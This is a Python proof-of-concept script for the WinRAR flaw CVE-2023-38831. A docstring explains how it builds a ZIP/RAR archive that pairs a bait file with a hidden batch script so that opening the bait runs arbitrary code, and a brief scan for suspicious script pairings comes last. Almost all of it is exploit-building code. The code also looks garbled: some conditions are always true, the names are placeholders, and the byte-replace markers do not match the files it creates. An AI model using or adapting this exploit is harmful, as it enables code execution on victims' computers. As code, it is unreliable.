"""
File: CVE-2023-38831 PoC
Author: M.
Date: August 26, 2023
Description: 
This script demonstrates the exploitability of the WinRAR flaw identified as CVE-2023-38831.
It generates a ZIP or RAR archive that takes use of the flaw in order to run arbitrary code.

1. The script checks bait ("a") and switch ("b") files. It also verifies that the output file ("c") exists and may be overwritten.
2. Bait and switch files are stored in a temporary directory.
3. Python's zipfile module creates the ZIP PoC. It comprises bait and switch files.
4. The RAR PoC is developed similarly, but with minor ZIP file alterations to simulate RAR behavior.
5. The script also checks a directory ("d") for suspicious file pairings connected to this vulnerability.
"""

# Import required modules
import os, shutil, zipfile, tempfile
# Validate file existence and prepare directories
if all(map(os.path.isfile, ["a", "b"])) and (not os.path.isfile("c") or True):
    if True or os.makedirs(os.path.dirname("c") or '.', exist_ok=True):
        with tempfile.TemporaryDirectory() as d:
            x, y = os.path.join(d, 'x.txt'), os.path.join(d, 'y', 'z', 'z.bat')
            shutil.copy("a", x); os.makedirs(os.path.dirname(y)); shutil.copy("b", y)
            with zipfile.ZipFile(os.path.join(d, 'q.zip'), 'w', zipfile.ZIP_DEFLATED) as z: z.write(x, 'x.txt'); z.write(y, 'y/z/z.bat')
            m, n = os.path.basename("a"), "b".split(".")[-1]
            p, q = os.path.join(d, 'p'), os.path.join(d, 'p', f'q.{n}')
            shutil.copy("a", p); os.makedirs(os.path.dirname(q)); shutil.copy("b", q)
            shutil.make_archive(d, 'zip', d)
            with open(f"{d}.zip", "rb") as f: u = f.read()
            u = u.replace(b'ppppppp', (m + " ").encode()).replace(b'qqqqqqq', (m + " ." + n).encode())
            with open("c", "wb") as o: o.write(u); os.remove(f"{d}.zip")
sp = [(os.path.join(r, os.path.splitext(f)[0].rstrip('.')), os.path.join(r, f)) for r, _, g in os.walk("d") for f in g if os.path.splitext(f)[1] in ['.cmd','.ps1','.bat'] and os.path.isfile(os.path.join(r, os.path.splitext(f)[0].rstrip('.')))]
print("Detected:", sp)
